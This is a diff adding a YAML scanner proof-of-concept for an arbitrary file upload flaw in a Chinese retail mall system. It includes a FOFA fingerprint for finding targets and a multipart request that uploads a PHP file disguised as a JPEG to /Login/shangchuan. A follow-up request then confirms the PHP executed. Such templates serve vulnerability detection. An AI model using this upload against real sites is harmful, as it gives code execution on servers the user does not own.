@@ -1,0 +1,34 @@
+id: poc-yaml-chuangke-shangchuan-anyfile-upload
+info:
+  name: 创客零售商城系统 shangchuan 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 创客零售商城系统
+  fofa: body="/Public/Xin/static/css/iconfont.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  datetime: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /Login/shangchuan
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------414826822120315253603069971739
+  data: '-----------------------------414826822120315253603069971739
+
+    Content-Disposition: form-data; name="file"; filename="1.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------414826822120315253603069971739--'
+  expression: status_code == 200 && contains(body,".php")
+  output:
+  - regex_match(body,"(?P<file>[0-9]+).php")
+- method: GET
+  path: /Uploads/txt/{{.datetime}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
